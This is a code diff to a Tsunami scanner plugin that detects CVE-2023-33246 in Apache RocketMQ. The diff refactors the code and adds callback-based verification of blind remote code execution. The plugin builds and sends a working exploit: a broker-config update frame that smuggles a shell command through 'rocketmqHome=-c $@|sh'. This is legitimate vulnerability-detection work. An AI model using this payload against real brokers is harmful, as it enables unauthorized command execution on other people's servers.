@@ -20,6 +20,8 @@ import static com.google.common.collect.ImmutableList.toImmutableList;
 
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
+import com.google.common.util.concurrent.Uninterruptibles;
+import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
@@ -37,7 +39,9 @@ import com.google.tsunami.proto.Vulnerability;
 import com.google.tsunami.proto.VulnerabilityId;
 import java.io.IOException;
 import java.nio.ByteBuffer;
+import java.nio.charset.StandardCharsets;
 import java.time.Clock;
+import java.time.Duration;
 import java.time.Instant;
 import javax.inject.Inject;
 
@@ -51,16 +55,16 @@ import javax.inject.Inject;
     bootstrapModule = RocketMQ_CVE202333246DetectorBootstrapModule.class)
 public final class RocketMQ_CVE202333246Detector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
-
   private static final String VULNERABILITY_ID = "CVE-2023-33246";
   private static final String VULNERABILITY_DESCRIPTION =
       "Apache RocketMQ allows unauthenticated attackers to modify the broker configuration "
           + "through a command injection vulnerability, leading to remote code execution.";
   private static final String VULNERABILITY_RECOMMENDATION =
       "Remove RocketMQ from internet exposure and apply the latest patches to mitigate the issue.";
-
   private static final String ROCKETMQ_RESPONSE_INDICATOR = "serializeTypeCurrentRPC";
 
+  private static final String ROCKETMQ_PAYLOAD_HEADER_TEMPLATE =
+      "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}";
   private final Clock utcClock;
   private final PayloadGenerator payloadGenerator;
 
@@ -85,29 +89,76 @@ public final class RocketMQ_CVE202333246Detector implements VulnDetector {
         .build();
   }
 
+  private byte[] preparePayload(Boolean isProbe, String command) {
+    int code;
+    String body = "";
+    if (isProbe) {
+      code = 0;
+      body = "";
+    } else {
+      code = 25;
+      body = "filterServerNums=1\nrocketmqHome=-c $@|sh . echo " + command + ";\n";
+    }
+
+    // Prepare payload
+    String jsonHeader = String.format(ROCKETMQ_PAYLOAD_HEADER_TEMPLATE, code);
+
+    byte[] jsonHeaderBytes = jsonHeader.getBytes(StandardCharsets.UTF_8);
+    byte[] bodyBytes = body.getBytes(StandardCharsets.UTF_8);
+
+    // Build the payload
+    int totalLength = 4 + jsonHeaderBytes.length + bodyBytes.length;
+    ByteBuffer payload = ByteBuffer.allocate(totalLength + 4);
+    payload.putInt(totalLength);
+    payload.putInt(jsonHeaderBytes.length);
+    payload.put(jsonHeaderBytes);
+    payload.put(bodyBytes);
+    return payload.array();
+  }
+
+  private byte[] prepareProbePayload() {
+    return this.preparePayload(true, null);
+  }
+
+  private byte[] sendPayload(NetworkService service, byte[] payload) {
+    var serviceIp = service.getNetworkEndpoint().getIpAddress().getAddress();
+    var servicePort = service.getNetworkEndpoint().getPort().getPortNumber();
+
+    try (var socket = new java.net.Socket(serviceIp, servicePort)) {
+      socket.getOutputStream().write(payload);
+
+      byte[] response = new byte[4096];
+      int bytesRead = socket.getInputStream().read(response);
+      if (bytesRead <= 0) {
+        logger.atWarning().log("Failed to read response from target server.");
+        return null;
+      }
+      return response;
+    } catch (IOException e) {
+      logger.atWarning().withCause(e).log(
+          "Failed to send payload to service at %s:%s.", serviceIp, servicePort);
+      return null;
+    }
+  }
+
   private boolean isRocketMQService(NetworkService service) {
     logger.atInfo().log("Checking if the service is a RocketMQ service.");
 
+    // Send Probe Payload
     byte[] probePayload = prepareProbePayload();
-    try (var socket =
-        new java.net.Socket(
-            service.getNetworkEndpoint().getIpAddress().getAddress(),
-            service.getNetworkEndpoint().getPort().getPortNumber())) {
-      socket.getOutputStream().write(probePayload);
-      byte[] response = new byte[4096];
-      int bytesRead = socket.getInputStream().read(response);
-      String responseStr =
-          new String(response, 0, bytesRead, java.nio.charset.StandardCharsets.UTF_8);
-      if (responseStr.contains(ROCKETMQ_RESPONSE_INDICATOR)) {
-        logger.atInfo().log("Service identified as RocketMQ.");
-        return true;
-      } else {
-        logger.atInfo().log("Service does not appear to be RocketMQ.");
-        return false;
-      }
-    } catch (IOException e) {
-      logger.atWarning().withCause(e).log(
-          "Failed to connect to the service at %s.", service.getNetworkEndpoint());
+    byte[] response = sendPayload(service, probePayload);
+
+    if (response == null) {
+      return false;
+    }
+
+    // Check response
+    String responseStr = new String(response, StandardCharsets.UTF_8);
+    if (responseStr.contains(ROCKETMQ_RESPONSE_INDICATOR)) {
+      logger.atInfo().log("Service identified as RocketMQ.");
+      return true;
+    } else {
+      logger.atInfo().log("Service does not appear to be RocketMQ.");
       return false;
     }
   }
@@ -117,88 +168,50 @@ public final class RocketMQ_CVE202333246Detector implements VulnDetector {
 
     PayloadGeneratorConfig payloadConfig =
         PayloadGeneratorConfig.newBuilder()
-            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
+            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
             .setInterpretationEnvironment(
                 PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
             .setExecutionEnvironment(
                 PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
             .build();
 
-    Payload payload = payloadGenerator.generate(payloadConfig);
-    String command = payload.getPayload();
-    byte[] preparedPayload = preparePayload(command);
+    Payload tsunamiPayload = payloadGenerator.generate(payloadConfig);
 
-    try (var socket =
-        new java.net.Socket(
-            service.getNetworkEndpoint().getIpAddress().getAddress(),
-            service.getNetworkEndpoint().getPort().getPortNumber())) {
-      socket.getOutputStream().write(preparedPayload);
-      byte[] response = new byte[1024];
-      socket.getInputStream().read(response);
-
-      // Wait 15 seconds before checking for callback
-      try {
-        Thread.sleep(15000);
-      } catch (InterruptedException e) {
-        Thread.currentThread().interrupt();
-        logger.atWarning().withCause(e).log("Thread was interrupted during sleep.");
-      }
-
-      return payload.checkIfExecuted();
-    } catch (IOException e) {
-      logger.atWarning().withCause(e).log("Failed to connect to the RocketMQ service.");
+    if (tsunamiPayload == null || !tsunamiPayload.getPayloadAttributes().getUsesCallbackServer()) {
+      logger.atWarning().log(
+          "The Tsunami callback server is not available, therefore the presence of the"
+              + " vulnerability cannot be verified.");
       return false;
     }
-  }
 
-  private byte[] preparePayload(String command) {
-    int code = 25;
-    String jsonHeader =
-        String.format(
-            "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}",
-            code);
-    byte[] jsonHeaderBytes = jsonHeader.getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    String command = tsunamiPayload.getPayload();
 
-    String body = "filterServerNums=1\nrocketmqHome=-c $@|sh . echo " + command + ";\n";
-    byte[] bodyBytes = body.getBytes(java.nio.charset.StandardCharsets.UTF_8);
+    // Prepare and send payload to the service
+    byte[] preparedPayload = preparePayload(false, command);
+    byte[] response = sendPayload(service, preparedPayload);
+    if (response == null) {
+      return false;
+    }
 
-    // Build the payload
-    int totalLength = 4 + jsonHeaderBytes.length + bodyBytes.length;
-    ByteBuffer buffer = ByteBuffer.allocate(totalLength + 4);
-    buffer.putInt(totalLength);
-    buffer.putInt(jsonHeaderBytes.length);
-    buffer.put(jsonHeaderBytes);
-    buffer.put(bodyBytes);
-    return buffer.array();
-  }
+    // Wait for execution before checking for callback
+    // We observed varying degrees of delays in responses from the target, so we wait up to one minute
+    // but we do it in 10s cycles so we can exit early if the response comes
+    Duration timeout = Duration.ofSeconds(10);
+    int retries = 6;
+    boolean executed = false;
+    for (int currentTry = 0; currentTry < retries && !executed; currentTry++) {
+      Uninterruptibles.sleepUninterruptibly(timeout);
+      executed = tsunamiPayload.checkIfExecuted();
+    }
 
-  private byte[] prepareProbePayload() {
-    int code = 0;
-    String jsonHeader =
-        String.format(
-            "{\"code\":%d,\"flag\":0,\"language\":\"JAVA\",\"opaque\":0,\"serializeTypeCurrentRPC\":\"JSON\",\"version\":395}",
-            code);
-    byte[] jsonHeaderBytes = jsonHeader.getBytes(java.nio.charset.StandardCharsets.UTF_8);
-
-    // No body for probe
-    byte[] bodyBytes = new byte[0];
-
-    // Build the payload
-    int totalLength = 4 + jsonHeaderBytes.length + bodyBytes.length;
-    ByteBuffer buffer = ByteBuffer.allocate(totalLength + 4);
-    buffer.putInt(totalLength);
-    buffer.putInt(jsonHeaderBytes.length);
-    buffer.put(jsonHeaderBytes);
-    buffer.put(bodyBytes);
-    return buffer.array();
+    return executed;
   }
 
   private DetectionReport buildDetectionReport(TargetInfo targetInfo, NetworkService service) {
     return DetectionReport.newBuilder()
         .setTargetInfo(targetInfo)
         .setNetworkService(service)
-        .setDetectionTimestamp(
-            com.google.protobuf.util.Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
+        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
         .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
         .setVulnerability(
             Vulnerability.newBuilder()
